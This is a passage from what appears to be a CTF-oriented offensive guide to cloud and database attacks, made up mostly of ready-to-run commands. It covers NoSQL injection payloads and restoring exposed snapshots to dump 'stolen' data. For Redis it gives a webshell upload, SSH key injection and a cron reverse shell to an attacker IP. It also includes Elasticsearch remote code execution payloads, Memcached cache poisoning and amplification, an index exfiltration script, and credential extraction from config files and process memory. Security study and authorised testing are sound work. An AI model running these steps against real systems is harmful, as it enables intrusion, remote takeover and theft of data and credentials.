dnsrecon -d vpce.amazonaws.com -t brt -D /usr/share/wordlists/services.txt

# Test DNS rebinding attacks
# Configure DNS server to return VPC endpoint IP
dig @attacker-dns-server rebind.attacker.com
```

### Service Endpoint Metadata Exposure

Some endpoints expose service metadata or configuration.

```bash
# S3 endpoint metadata
curl http://bucket.vpce-xxxxx.s3.region.vpce.amazonaws.com
curl -v http://bucket.s3.amazonaws.com

# DynamoDB endpoint testing
aws dynamodb list-tables --endpoint-url https://vpce-xxxxx.dynamodb.region.vpce.amazonaws.com

# Secrets Manager endpoint
aws secretsmanager list-secrets --endpoint-url https://vpce-xxxxx.secretsmanager.region.vpce.amazonaws.com

# Systems Manager Parameter Store
aws ssm describe-parameters --endpoint-url https://vpce-xxxxx.ssm.region.vpce.amazonaws.com
```

### Interface Endpoint Enumeration

Interface endpoints create ENIs with private IPs in subnets.

```bash
# Enumerate ENIs associated with endpoints
aws ec2 describe-network-interfaces \
    --filters "Name=description,Values=VPC Endpoint Interface*" \
    --query 'NetworkInterfaces[*].[NetworkInterfaceId,PrivateIpAddress,Description]' \
    --output table

# Scan endpoint ENI IPs
nmap -sV -p 443,80,8080 endpoint-private-ip

# Test HTTPS services on endpoint IPs
curl -k https://endpoint-private-ip
curl -k https://endpoint-private-ip -H "Host: service-name.region.amazonaws.com"
```

### Cross-Account Endpoint Access

[Inference] VPC endpoints can be configured for cross-account access, potentially exposing services.

```bash
# Check endpoint service permissions
aws ec2 describe-vpc-endpoint-service-permissions \
    --service-id vpce-svc-xxxxx

# Attempt cross-account endpoint creation
aws ec2 create-vpc-endpoint \
    --vpc-id vpc-xxxxx \
    --service-name com.amazonaws.vpce.region.vpce-svc-xxxxx \
    --vpc-endpoint-type Interface

# Test access with different account credentials
AWS_PROFILE=alternate-account aws s3 ls --endpoint-url https://vpce-xxxxx.s3.region.vpce.amazonaws.com
```

### PrivateLink Service Discovery

AWS PrivateLink enables custom service exposure.

```bash
# Discover available PrivateLink services
aws ec2 describe-vpc-endpoint-services \
    --query 'ServiceNames' --output text

# Filter for third-party/custom services
aws ec2 describe-vpc-endpoint-services | grep -v "com.amazonaws"

# Test custom service connectivity
aws ec2 create-vpc-endpoint \
    --vpc-id vpc-xxxxx \
    --service-name com.amazonaws.vpce.region.vpce-svc-custom \
    --vpc-endpoint-type Interface \
    --dry-run
```

### Endpoint Security Group Analysis

Interface endpoints have security groups controlling access.

```bash
# Identify security groups attached to endpoint ENIs
aws ec2 describe-network-interfaces \
    --network-interface-ids eni-xxxxx \
    --query 'NetworkInterfaces[0].Groups[*].[GroupId,GroupName]' \
    --output table

# Analyze security group rules
aws ec2 describe-security-groups --group-ids sg-xxxxx

# Test access from different sources
# From allowed CIDR
curl -k https://endpoint-private-ip

# From unauthorized CIDR (should fail)
# Use SSH tunnel or VPN to test from different source IPs
```

### Public Endpoint Misconfiguration

[Unverified] Cloud services sometimes expose endpoints publicly when private access was intended.

```bash
# Check for publicly accessible database endpoints
nmap -sV -p 1433,3306,5432,27017 public-endpoint.region.cloud-provider.com

# Test RDS endpoint access
mysql -h database.cluster-xxxxx.region.rds.amazonaws.com -u admin -p

# MongoDB public endpoints
mongo "mongodb://public-endpoint.region.mongodb.net:27017"

# Redis public endpoints (common misconfiguration)
redis-cli -h public-endpoint.region.cache.amazonaws.com -p 6379
```

### API Gateway Endpoint Exploitation

API Gateway endpoints may expose internal services.

```bash
# Enumerate API Gateway endpoints
aws apigateway get-rest-apis
aws apigateway get-resources --rest-api-id api-id

# Test API endpoints
curl https://api-id.execute-api.region.amazonaws.com/stage/resource

# Fuzz API paths
ffuf -w /usr/share/wordlists/api/common-api-endpoints.txt \
    -u https://api-id.execute-api.region.amazonaws.com/stage/FUZZ

# Test authorization bypass
curl https://api-endpoint/admin -H "Authorization: Bearer token"
curl https://api-endpoint/admin -H "X-API-Key: test"
```

---

**Related Topics for Further Study**: VPC peering exploitation, cloud firewall bypass techniques, service mesh security, container network policies, cloud NAT gateway abuse, IPv6 in cloud networks, cloud IDS/IPS evasion.

---

# Database & Data Store Testing

## RDS/Cloud SQL Exposure

### AWS RDS Enumeration

**Discovery & Information Gathering**

```bash
# List all RDS instances (requires valid AWS credentials)
aws rds describe-db-instances

# List RDS snapshots
aws rds describe-db-snapshots

# Get specific instance details
aws rds describe-db-instances --db-instance-identifier <instance-name>

# Check security groups attached to RDS
aws rds describe-db-instances --query 'DBInstances[*].[DBInstanceIdentifier,VpcSecurityGroups]'
```

**Public Accessibility Checks**

```bash
# Identify publicly accessible RDS instances
aws rds describe-db-instances --query 'DBInstances[?PubliclyAccessible==`true`].[DBInstanceIdentifier,Endpoint.Address,Endpoint.Port]'

# Check for instances in default VPC
aws rds describe-db-instances --query 'DBInstances[?DBSubnetGroup.VpcId==`vpc-default`]'
```

**Security Group Analysis**

```bash
# Extract security group IDs from RDS instances
aws rds describe-db-instances --query 'DBInstances[*].VpcSecurityGroups[*].VpcSecurityGroupId' --output text

# Check security group rules for overly permissive access
aws ec2 describe-security-groups --group-ids <sg-id> --query 'SecurityGroups[*].IpPermissions[?IpRanges[?CidrIp==`0.0.0.0/0`]]'
```

**Connection Testing**

```bash
# MySQL/MariaDB connection
mysql -h <rds-endpoint> -P 3306 -u <username> -p

# PostgreSQL connection
psql -h <rds-endpoint> -p 5432 -U <username> -d <database>

# Test for default credentials (common in CTF)
mysql -h <rds-endpoint> -u admin -padmin
mysql -h <rds-endpoint> -u root -p
psql -h <rds-endpoint> -U postgres
```

**Nmap Scanning**

```bash
# Identify database services
nmap -p 3306,5432,1433,27017 <rds-endpoint>

# Service version detection
nmap -sV -p 3306 <rds-endpoint>

# Database-specific NSE scripts
nmap -p 3306 --script mysql-info,mysql-enum <rds-endpoint>
nmap -p 5432 --script pgsql-brute <rds-endpoint>
```

### Google Cloud SQL

**GCloud CLI Enumeration**

```bash
# List all Cloud SQL instances
gcloud sql instances list

# Get specific instance details
gcloud sql instances describe <instance-name>

# List databases in instance
gcloud sql databases list --instance=<instance-name>

# Check if instance has public IP
gcloud sql instances describe <instance-name> --format='get(ipAddresses[0].ipAddress)'
```

**Authorized Networks Check**

```bash
# View authorized networks (IP whitelist)
gcloud sql instances describe <instance-name> --format='get(settings.ipConfiguration.authorizedNetworks)'

# Check for 0.0.0.0/0 in authorized networks (public access)
gcloud sql instances describe <instance-name> --format='json' | jq '.settings.ipConfiguration.authorizedNetworks[] | select(.value=="0.0.0.0/0")'
```

**Connection Methods**

```bash
# Using Cloud SQL Proxy
cloud_sql_proxy -instances=<project>:<region>:<instance>=tcp:3306

# Direct connection (if public IP and authorized)
mysql -h <public-ip> -u <user> -p

# Using gcloud connection helper
gcloud sql connect <instance-name> --user=<username>
```

### Azure SQL Database

**Azure CLI Enumeration**

```bash
# List all SQL servers
az sql server list

# List databases on specific server
az sql db list --resource-group <rg-name> --server <server-name>

# Check firewall rules
az sql server firewall-rule list --resource-group <rg-name> --server <server-name>

# Identify public access rules
az sql server firewall-rule list --resource-group <rg-name> --server <server-name> --query "[?startIpAddress=='0.0.0.0']"
```

**Connection String Exploitation**

```bash
# Standard connection format
sqlcmd -S <server-name>.database.windows.net -d <database-name> -U <username> -P <password>

# Using Python
python3 -c "import pymssql; conn = pymssql.connect(server='<server>.database.windows.net', user='<user>', password='<pass>', database='<db>')"
```

**Common Misconfigurations**

- Firewall rule allowing 0.0.0.0-255.255.255.255 (Azure portal "Allow Azure services" creates 0.0.0.0 rule)
- SQL authentication enabled with weak passwords
- No connection encryption enforcement
- Auditing/threat detection disabled

---

## NoSQL Injection (DynamoDB, CosmosDB)

### DynamoDB Injection Techniques

**Query Parameter Manipulation**

DynamoDB uses JSON-based query syntax that can be vulnerable when user input is improperly sanitized.

```python
# Vulnerable application code example (Python/boto3)
import boto3
dynamodb = boto3.resource('dynamodb')
table = dynamodb.Table('Users')

# Vulnerable: Direct string concatenation
user_id = request.args.get('id')  # Attacker controlled
response = table.get_item(Key={'user_id': user_id})

# Exploitation payload
# Normal: ?id=12345
# Inject: ?id={"S":"admin"}  # Type confusion attack
```

**Condition Expression Injection**

```python
# Vulnerable filter expression
filter_exp = f"username = :uname AND password = :pwd"

# Injection in ExpressionAttributeValues
# Normal: {"uname": "alice", "pwd": "pass123"}
# Inject: {"uname": "admin", "pwd": {"$ne": ""}}  # [Inference] May bypass authentication
```

**Attribute Name Injection**

```bash
# API request manipulation
aws dynamodb query \
  --table-name Users \
  --key-condition-expression "user_id = :id" \
  --expression-attribute-values '{":id": {"S": "admin"}}'

# Injection attempt (check for error-based info disclosure)
aws dynamodb query \
  --table-name Users \
  --key-condition-expression "user_id = :id OR 1=1" \
  --expression-attribute-values '{":id": {"S": "admin"}}'
```

**Scanning for Data Extraction**

```bash
# Extract all table data (if permissions allow)
aws dynamodb scan --table-name <table-name>

# Paginated scan for large tables
aws dynamodb scan --table-name <table-name> --max-items 100

# Filter scan results
aws dynamodb scan --table-name Users --filter-expression "admin = :admin_val" --expression-attribute-values '{":admin_val": {"BOOL": true}}'
```

**Tool: NoSQLMap (DynamoDB Support)**

[Unverified] NoSQLMap's DynamoDB support is limited compared to MongoDB. Manual testing is more effective.

```bash
# Basic usage (limited effectiveness)
git clone https://github.com/codingo/NoSQLMap.git
python nosqlmap.py --target <url> --attack 1
```

### MongoDB Injection (Common in Cloud Environments)

**Authentication Bypass**

```javascript
// Vulnerable query
db.users.find({username: username, password: password})

// Injection payloads
username[$ne]=null&password[$ne]=null
username=admin&password[$regex]=.*
username=admin&password[$gt]=
```

**Command Injection via $where**

```javascript
// Payload injecting JavaScript
username=admin&password=1'; return true; var dummy='

// Full query becomes
db.users.find({$where: "this.username=='admin' && this.password=='1'; return true; var dummy=''"})
```

**Tool: NoSQLMap (MongoDB)**

```bash
python nosqlmap.py --target http://target.com/login --attack 1 --verb POST --data "username=admin&password=test"

# Test for specific injection types
python nosqlmap.py --target <url> --attack 2  # JavaScript injection
python nosqlmap.py --target <url> --attack 3  # Timing-based
```

### Azure CosmosDB Injection

**SQL API Injection**

CosmosDB's SQL API uses a SQL-like query syntax:

```sql
-- Normal query
SELECT * FROM c WHERE c.username = 'admin' AND c.password = 'pass123'

-- Injection attempts
' OR 1=1--
' UNION SELECT * FROM c--
admin' AND '1'='1
```

**REST API Manipulation**

```bash
# Query documents via REST API
curl -X POST \
  https://<account>.documents.azure.com/dbs/<db>/colls/<coll>/docs \
  -H "Authorization: type=master&ver=1.0&sig=<sig>" \
  -H "x-ms-documentdb-isquery: True" \
  -d '{"query": "SELECT * FROM c WHERE c.id=\"admin\"", "parameters": []}'

# Injection in query string
{"query": "SELECT * FROM c WHERE c.id=\"admin\" OR 1=1--\"", "parameters": []}
```

**Partition Key Enumeration**

```bash
# List collections and partition keys
az cosmosdb sql container show \
  --account-name <account> \
  --database-name <db> \
  --name <collection> \
  --query "partitionKey"
```

**Tool: Burp Suite Extensions**

```
Extensions -> BApp Store -> Install "NoSQL Injection"
Intercept requests -> Right-click -> "Scan for NoSQL injection"
```

---

## Database Backup Enumeration

### AWS RDS Snapshots

**Manual Snapshot Discovery**

```bash
# List all RDS snapshots (automated and manual)
aws rds describe-db-snapshots

# List only public snapshots
aws rds describe-db-snapshots --include-public

# Filter by specific instance
aws rds describe-db-snapshots --db-instance-identifier <instance-name>

# Check snapshot permissions (public exposure)
aws rds describe-db-snapshot-attributes --db-snapshot-identifier <snapshot-id>
```

**Automated Snapshot Enumeration**

```bash
# List snapshots with creation time
aws rds describe-db-snapshots --query 'DBSnapshots[*].[DBSnapshotIdentifier,SnapshotCreateTime,Encrypted]' --output table

# Find unencrypted snapshots
aws rds describe-db-snapshots --query 'DBSnapshots[?Encrypted==`false`].[DBSnapshotIdentifier,DBInstanceIdentifier]'
```

**Cross-Account Snapshot Sharing Detection**

```bash
# Check if snapshot is shared with other accounts
aws rds describe-db-snapshot-attributes --db-snapshot-identifier <snapshot-id> --query 'DBSnapshotAttributesResult.DBSnapshotAttributes[?AttributeName==`restore`].AttributeValues'

# List snapshots shared with your account
aws rds describe-db-snapshots --include-shared --query 'DBSnapshots[*].[DBSnapshotIdentifier,DBInstanceIdentifier]'
```

**Tool: Prowler (Automated Security Checks)**

```bash
# Install Prowler
git clone https://github.com/prowler-cloud/prowler
cd prowler

# Check for public RDS snapshots
./prowler aws --service rds --check rds_snapshots_public_access

# Check for unencrypted snapshots
./prowler aws --service rds --check rds_snapshots_encrypted
```

### S3 Backup Discovery

**Common Backup Naming Patterns**

```bash
# Search for backup-related buckets
aws s3 ls | grep -E '(backup|dump|snapshot|export|archive)'

# Check specific patterns
aws s3 ls s3://<company>-db-backup
aws s3 ls s3://<company>-rds-snapshots
aws s3 ls s3://prod-db-backup-<region>
```

**Automated S3 Bucket Enumeration**

```bash
# Using S3Scanner
git clone https://github.com/sa7mon/S3Scanner.git
python3 s3scanner.py --bucket-file bucket_list.txt

# Using Cloud_enum
git clone https://github.com/initstring/cloud_enum.git
python3 cloud_enum.py -k <company-name>
```

**SQL Dump File Discovery**

```bash
# List and search for dump files
aws s3 ls s3://<bucket>/ --recursive | grep -E '\.(sql|dump|bak|backup)$'

# Download database dump
aws s3 cp s3://<bucket>/database.sql.gz .
gunzip database.sql.gz
```

### Azure Backup Enumeration

**List Backup Vaults**

```bash
# List Recovery Services vaults
az backup vault list

# List backup items in vault
az backup item list --resource-group <rg> --vault-name <vault>

# List SQL database backups
az backup recoverypoint list \
  --resource-group <rg> \
  --vault-name <vault> \
  --container-name <container> \
  --item-name <item>
```

**Storage Account Backup Discovery**

```bash
# List storage accounts
az storage account list

# Check for backup containers
az storage container list --account-name <account>

# Look for backup blobs
az storage blob list --container-name backup --account-name <account>
```

### Google Cloud Backup Enumeration

**Cloud SQL Backups**

```bash
# List backups for an instance
gcloud sql backups list --instance=<instance-name>

# Describe specific backup
gcloud sql backups describe <backup-id> --instance=<instance-name>
```

**GCS Backup Discovery**

```bash
# List buckets
gcloud storage buckets list

# Search for backup patterns
gcloud storage ls gs://*backup*
gcloud storage ls gs://*dump*

# List objects in backup bucket
gcloud storage ls gs://<bucket-name>/**
```

---

## Snapshot Exploitation

### Restoring RDS Snapshots

**Create New Instance from Snapshot**

```bash
# Restore snapshot to new RDS instance
aws rds restore-db-instance-from-db-snapshot \
  --db-instance-identifier exploited-db \
  --db-snapshot-identifier <snapshot-id> \
  --publicly-accessible

# Modify security group to allow access
aws rds modify-db-instance \
  --db-instance-identifier exploited-db \
  --vpc-security-group-ids <sg-id> \
  --apply-immediately

# Wait for instance to become available
aws rds wait db-instance-available --db-instance-identifier exploited-db
```

**Modifying Restored Instance for Access**

```bash
# Create permissive security group
aws ec2 create-security-group \
  --group-name exploit-sg \
  --description "Temporary access" \
  --vpc-id <vpc-id>

# Allow inbound from your IP
aws ec2 authorize-security-group-ingress \
  --group-id <sg-id> \
  --protocol tcp \
  --port 3306 \
  --cidr <your-ip>/32

# Apply to restored instance
aws rds modify-db-instance \
  --db-instance-identifier exploited-db \
  --vpc-security-group-ids <sg-id> \
  --apply-immediately
```

**Extracting Data**

```bash
# Connect to restored instance
mysql -h <restored-endpoint> -u <username> -p

# Enumerate databases
SHOW DATABASES;

# Dump all data
mysqldump -h <restored-endpoint> -u <username> -p --all-databases > stolen_data.sql

# Target specific tables
mysqldump -h <restored-endpoint> -u <username> -p <database> users > users.sql
```

### EBS Snapshot Exploitation

**Public EBS Snapshot Discovery**

```bash
# Search for public snapshots (requires snapshot ID hints)
aws ec2 describe-snapshots --owner-ids self --restorable-by-user-ids all

# Check specific snapshot permissions
aws ec2 describe-snapshot-attribute --snapshot-id <snap-id> --attribute createVolumePermission
```

**Mounting EBS Volumes from Snapshots**

```bash
# Create volume from snapshot
aws ec2 create-volume \
  --snapshot-id <snap-id> \
  --availability-zone <az> \
  --volume-type gp2

# Launch EC2 instance in same AZ
aws ec2 run-instances \
  --image-id <ami-id> \
  --instance-type t2.micro \
  --key-name <key-pair> \
  --subnet-id <subnet-id>

# Attach volume to instance
aws ec2 attach-volume \
  --volume-id <vol-id> \
  --instance-id <instance-id> \
  --device /dev/sdf

# SSH to instance and mount
ssh -i key.pem ec2-user@<instance-ip>
sudo lsblk  # Identify device
sudo mkdir /mnt/exploit
sudo mount /dev/xvdf1 /mnt/exploit
```

**Extracting Sensitive Data from Mounted Volume**

```bash
# Search for database files
find /mnt/exploit -name "*.db" -o -name "*.sql" -o -name "*.mdb"

# Look for configuration files
grep -r "password" /mnt/exploit/etc/
grep -r "connection" /mnt/exploit/var/www/

# Extract MySQL data directory
cp -r /mnt/exploit/var/lib/mysql/ /tmp/stolen/

# Parse MySQL data files (if innodb)
# Use mysqlfrm or similar tools on .ibd files
```

### Azure Disk Snapshot Exploitation

**Create Disk from Snapshot**

```bash
# List snapshots
az snapshot list

# Create managed disk from snapshot
az disk create \
  --resource-group <rg> \
  --name exploited-disk \
  --source <snapshot-id>

# Attach to VM
az vm disk attach \
  --resource-group <rg> \
  --vm-name <vm-name> \
  --name exploited-disk
```

**Mounting and Analysis**

```bash
# SSH to VM
ssh azureuser@<vm-ip>

# Identify new disk
lsblk

# Mount disk
sudo mkdir /mnt/exploit
sudo mount /dev/sdc1 /mnt/exploit

# Search for sensitive data
find /mnt/exploit -type f -name "*.config"
find /mnt/exploit -type f -name "web.config" -exec grep -H "connectionString" {} \;
```

### Google Cloud Disk Snapshot Exploitation

**Create Disk from Snapshot**

```bash
# List snapshots
gcloud compute snapshots list

# Create disk from snapshot
gcloud compute disks create exploited-disk \
  --source-snapshot=<snapshot-name> \
  --zone=<zone>

# Attach to instance
gcloud compute instances attach-disk <instance-name> \
  --disk=exploited-disk \
  --zone=<zone>
```

**Data Extraction**

```bash
# SSH to instance
gcloud compute ssh <instance-name> --zone=<zone>

# Mount and analyze (same as EBS process)
sudo mkdir /mnt/exploit
sudo mount /dev/sdb1 /mnt/exploit
```

### Automated Snapshot Exploitation Tools

**Tool: Pacu (AWS Exploitation Framework)**

```bash
# Install Pacu
git clone https://github.com/RhinoSecurityLabs/pacu.git
cd pacu && bash install.sh

# Run RDS snapshot enumeration module
run rds__explore_snapshots

# Restore snapshot module [Unverified - manual module creation may be needed]
# Manual restoration via AWS CLI is more reliable
```

**Tool: cloud_enum (Discovery)**

```bash
git clone https://github.com/initstring/cloud_enum.git
python3 cloud_enum.py -k <company> -k <product> --quickscan
```

---

## Important Security Considerations

**Encryption Status Verification**

Always check if snapshots/backups are encrypted:

```bash
# AWS
aws rds describe-db-snapshots --query 'DBSnapshots[*].[DBSnapshotIdentifier,Encrypted]'

# Azure
az sql db show --resource-group <rg> --server <server> --name <db> --query "transparentDataEncryption"
```

**Credential Extraction from Backups**

Common locations for credentials in database backups:

- Application user tables (hashed passwords)
- Configuration tables (connection strings)
- Audit/log tables (may contain plaintext passwords from failed logins)
- MySQL `mysql.user` table (password hashes)
- PostgreSQL `pg_authid` table

**Tool: truffleHog (Secret Scanning)**

```bash
# Scan SQL dump for secrets
trufflehog filesystem /path/to/database.sql --json

# Scan mounted volume
trufflehog filesystem /mnt/exploit/
```

---

**Related Topics to Explore**

- **Serverless Database Security**: Aurora Serverless, DynamoDB Streams exploitation
- **Database Activity Monitoring Bypass**: Techniques for evading CloudWatch/Azure Monitor alerts
- **Cross-Account IAM Exploitation**: Assuming roles to access shared snapshots

---

## Redis Exposure

### Understanding Redis Security Model

Redis is an in-memory data structure store operating on TCP port 6379 (default). In CTF environments, Redis instances are frequently exposed without authentication or with weak configurations, providing direct access to sensitive data and potential remote code execution.

### Reconnaissance & Enumeration

**Port Discovery:**

```bash
nmap -p 6379 -sV --script redis-info <target>
```

**Manual Connection Testing:**

```bash
redis-cli -h <target_ip> -p 6379
nc <target_ip> 6379
telnet <target_ip> 6379
```

**Authentication Check:**

```bash
redis-cli -h <target_ip> ping
# Response "PONG" = no auth required
# Response "NOAUTH Authentication required" = auth needed
```

### Information Gathering

**Server Information:**

```bash
INFO
INFO server
INFO keyspace
INFO replication
```

**Configuration Extraction:**

```bash
CONFIG GET *
CONFIG GET dir
CONFIG GET dbfilename
CONFIG GET requirepass
```

**Key Enumeration:**

```bash
KEYS *
SCAN 0 COUNT 1000
DBSIZE
```

**Data Extraction:**

```bash
GET <keyname>
HGETALL <keyname>
SMEMBERS <keyname>
LRANGE <keyname> 0 -1
```

### Exploitation Techniques

**Webshell Upload via RDB File (Linux):**

```bash
# Set working directory to web root
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET webshell "<?php system($_GET['cmd']); ?>"
SAVE
# Access: http://target/shell.php?cmd=id
```

**SSH Key Injection (Linux):**

```bash
# Generate SSH key pair
ssh-keygen -t rsa -f redis_key

# Prepare key with padding
(echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > key.txt

# Inject into Redis
cat key.txt | redis-cli -h <target> -x set ssh_key
CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
SAVE

# Connect
ssh -i redis_key root@<target>
```

**Cron Job Injection (Linux):**

```bash
CONFIG SET dir /var/spool/cron/crontabs
CONFIG SET dbfilename root
SET cron_job "\n\n*/1 * * * * /bin/bash -c 'bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1'\n\n"
SAVE
```

**Module Loading for RCE (Redis ≥4.0):**

```bash
# Using redis-rogue-server
python3 redis-rogue-server.py --rhost <target> --lhost <attacker_ip>

# Manual module loading
MODULE LOAD /path/to/malicious.so
```

### Tools

**redis-cli:** Built-in client

```bash
redis-cli -h <target> -p 6379 -a <password> --raw
```

**redis-rogue-server:** Automated exploitation

```bash
git clone https://github.com/n0b0dyCN/redis-rogue-server
python3 redis-rogue-server.py --rhost <target> --lhost <attacker_ip> --rport 6379 --lport 21000
```

**Metasploit Module:**

```bash
use auxiliary/scanner/redis/redis_server
use exploit/linux/redis/redis_unauth_exec
```

---

## Memcached Exposure

### Understanding Memcached

Memcached operates as a distributed memory caching system on UDP port 11211 (default) or TCP port 11211. Unlike Redis, it lacks built-in authentication in many versions and is designed for trusted network environments.

### Reconnaissance

**Service Detection:**

```bash
nmap -p 11211 -sV -sU --script memcached-info <target>
nmap -p 11211 -sV -sT <target>
```

**Direct Connection:**

```bash
nc <target> 11211
telnet <target> 11211
```

### Enumeration Commands

**Statistics Gathering:**

```bash
stats
stats items
stats slabs
stats cachedump <slab_id> <limit>
```

**Version Detection:**

```bash
version
```

**Key Dumping:**

```bash
# List all slabs
stats items

# For each slab, dump keys
stats cachedump <slab_id> 0

# Example:
stats cachedump 1 0
stats cachedump 2 0
```

**Data Retrieval:**

```bash
get <keyname>
```

### Exploitation Techniques

**Automated Key Extraction:**

```bash
# Using memcached-cli
pip install python-memcached
python -c "import memcache; mc = memcache.Client(['<target>:11211']); print(mc.get_stats())"
```

**Mass Key Dumping Script:**

```bash
#!/bin/bash
echo "stats items" | nc <target> 11211 | grep "STAT items" | awk '{print $2}' | cut -d: -f1 | sort -u | while read slab; do
    echo "stats cachedump $slab 0" | nc <target> 11211
done
```

**Data Poisoning (Cache Poisoning):**

```bash
# Set malicious value
set <keyname> 0 0 <length>
<malicious_data>

# Example: Session hijacking
set session:12345 0 0 50
{"user":"admin","role":"administrator","authenticated":true}
```

**Amplification Attack Vector (DDoS):** [Unverified application in CTF context - this is primarily a network security concern]

```bash
# Stats command generates large response
echo -e "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n" | nc -u <target> 11211
```

### Tools

**libmemcached-tools:**

```bash
apt install libmemcached-tools
memcstat --servers=<target>:11211
memcdump --servers=<target>:11211
memccat --servers=<target>:11211 <keyname>
```

**memcached-tool:**

```bash
memcached-tool <target>:11211 dump
```

**Metasploit:**

```bash
use auxiliary/gather/memcached_extractor
use auxiliary/scanner/memcached/memcached_amp
```

---

## Elasticsearch Misconfiguration

### Understanding Elasticsearch Security

Elasticsearch is a distributed search and analytics engine typically running on TCP port 9200 (HTTP API) and 9300 (transport protocol). Common misconfigurations include disabled authentication, exposed management APIs, and unrestricted network access.

### Reconnaissance

**Service Detection:**

```bash
nmap -p 9200,9300 -sV --script elastic-* <target>
curl http://<target>:9200
curl http://<target>:9200/_cluster/health?pretty
```

**Version Identification:**

```bash
curl http://<target>:9200/
curl -X GET "http://<target>:9200/_nodes?pretty"
```

### Enumeration

**Cluster Information:**

```bash
curl http://<target>:9200/_cluster/health?pretty
curl http://<target>:9200/_cluster/stats?pretty
curl http://<target>:9200/_cluster/state?pretty
curl http://<target>:9200/_nodes?pretty
```

**Index Enumeration:**

```bash
curl http://<target>:9200/_cat/indices?v
curl http://<target>:9200/_aliases?pretty
curl http://<target>:9200/_mapping?pretty
```

**Data Extraction:**

```bash
# List all documents in index
curl http://<target>:9200/<index_name>/_search?pretty

# Retrieve all documents (limited by max_result_window, default 10000)
curl http://<target>:9200/<index_name>/_search?pretty&size=10000

# Scroll API for large datasets
curl -X GET "http://<target>:9200/<index_name>/_search?scroll=1m&size=1000&pretty"

# Retrieve specific document
curl http://<target>:9200/<index_name>/_doc/<document_id>?pretty
```

**Search Query Examples:**

```bash
# Match all
curl -X GET "http://<target>:9200/<index_name>/_search?pretty" -H 'Content-Type: application/json' -d'
{
  "query": { "match_all": {} }
}'

# Search for specific term
curl -X GET "http://<target>:9200/<index_name>/_search?pretty" -H 'Content-Type: application/json' -d'
{
  "query": { "match": { "field_name": "password" } }
}'

# Wildcard search
curl -X GET "http://<target>:9200/_search?pretty&q=*password*"
```

### Exploitation Techniques

**Directory Traversal (CVE-2015-3337, Elasticsearch <1.4.5, <1.5.2):** [Unverified - verify version compatibility]

```bash
curl http://<target>:9200/_plugin/../../../../etc/passwd
```

**Remote Code Execution via Groovy Scripting (Elasticsearch <1.4.3):** [Unverified - verify version compatibility]

```bash
curl -X POST "http://<target>:9200/_search?pretty" -H 'Content-Type: application/json' -d'
{
  "size": 1,
  "script_fields": {
    "rce": {
      "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"
    }
  }
}'
```

**Script Execution via Painless (Modern Elasticsearch):** [Inference - depends on script.allowed_types configuration]

```bash
curl -X POST "http://<target>:9200/_search?pretty" -H 'Content-Type: application/json' -d'
{
  "script_fields": {
    "test": {
      "script": {
        "lang": "painless",
        "source": "Runtime.getRuntime().exec(\"whoami\")"
      }
    }
  }
}'
```

**Arbitrary File Read via Snapshot Repository:**

```bash
# Create repository pointing to sensitive location
curl -X PUT "http://<target>:9200/_snapshot/test_repo?pretty" -H 'Content-Type: application/json' -d'
{
  "type": "fs",
  "settings": {
    "location": "/etc"
  }
}'

# Create snapshot
curl -X PUT "http://<target>:9200/_snapshot/test_repo/snapshot_1?wait_for_completion=true&pretty"

# Retrieve snapshot (files may be encoded/compressed)
curl "http://<target>:9200/_snapshot/test_repo/snapshot_1/_status?pretty"
```

**Data Exfiltration Automation:**

```bash
# Python script example
#!/usr/bin/env python3
import requests
import json

target = "http://<target>:9200"
indices = requests.get(f"{target}/_cat/indices?format=json").json()

for index in indices:
    index_name = index['index']
    print(f"[+] Extracting: {index_name}")
    
    response = requests.post(
        f"{target}/{index_name}/_search?scroll=1m",
        json={"size": 1000, "query": {"match_all": {}}},
        headers={"Content-Type": "application/json"}
    )
    
    data = response.json()
    scroll_id = data.get('_scroll_id')
    
    with open(f"{index_name}.json", "w") as f:
        json.dump(data['hits']['hits'], f, indent=2)
```

### Tools

**elasticdump:** Data extraction utility

```bash
npm install -g elasticdump
elasticdump --input=http://<target>:9200/<index> --output=<output_file>.json --type=data
```

**Metasploit:**

```bash
use auxiliary/scanner/elasticsearch/indices_enum
```

**elasticsearch-crawler:**

```bash
git clone https://github.com/AmIJesse/Elasticsearch-Crawler
python elasticsearch-crawler.py http://<target>:9200
```

---

## Database Credential Extraction

### Overview

Database credential extraction involves locating and retrieving authentication credentials from configuration files, environment variables, application code, memory dumps, and database-specific storage locations across various database management systems.

### Common Credential Locations by Platform

**Linux Systems:**

- `/etc/mysql/my.cnf` (MySQL/MariaDB)
- `/etc/postgresql/<version>/main/pg_hba.conf` (PostgreSQL)
- `/var/www/html/config.php` (Web applications)
- `/opt/<application>/conf/` (Application configs)
- `~/.my.cnf` (User-specific MySQL configs)
- Environment variables: `/proc/<pid>/environ`

**Windows Systems:**

- `C:\Program Files\MySQL\MySQL Server <version>\my.ini`
- `C:\xampp\mysql\bin\my.ini`
- `C:\inetpub\wwwroot\web.config`
- Registry: `HKLM\SOFTWARE\MySQL AB\`
- `C:\Users\<user>\AppData\Roaming\` (Application data)

### MySQL/MariaDB

**Configuration File Analysis:**

```bash
cat /etc/mysql/my.cnf | grep -i password
cat /etc/mysql/debian.cnf  # Debian maintenance account
find / -name "my.cnf" 2>/dev/null
```

**Password Extraction from mysql.user Table (Requires Access):**

```bash
mysql -u root -p
use mysql;
SELECT user, host, authentication_string FROM user;
SELECT user, host, password FROM user;  # Older versions
```

**Hash Cracking:**

```bash
# MySQL 5.x/8.x hash format
hashcat -m 300 hash.txt wordlist.txt

# Old MySQL <=4.1
hashcat -m 200 hash.txt wordlist.txt
```

**Extracting from mysqldump Files:**

```bash
grep -i "password" dump.sql
grep "CREATE USER" dump.sql
```

**Memory Dump Analysis (Requires Root):**

```bash
strings /proc/<mysql_pid>/mem | grep -i password
gdb -p <mysql_pid>
(gdb) dump memory mysql_mem.dump 0x00000000 0x7fffffff
strings mysql_mem.dump | grep -E "(password|pass=|pwd=)"
```

### PostgreSQL

**Configuration Files:**

```bash
cat /etc/postgresql/*/main/pg_hba.conf
cat /var/lib/pgsql/data/pg_hba.conf
find / -name "pg_hba.conf" 2>/dev/null
```

**Password Extraction (Requires Access):**

```bash
psql -U postgres
SELECT usename, passwd FROM pg_shadow;
SELECT rolname, rolpassword FROM pg_authid;
```

**Environment Variables:**

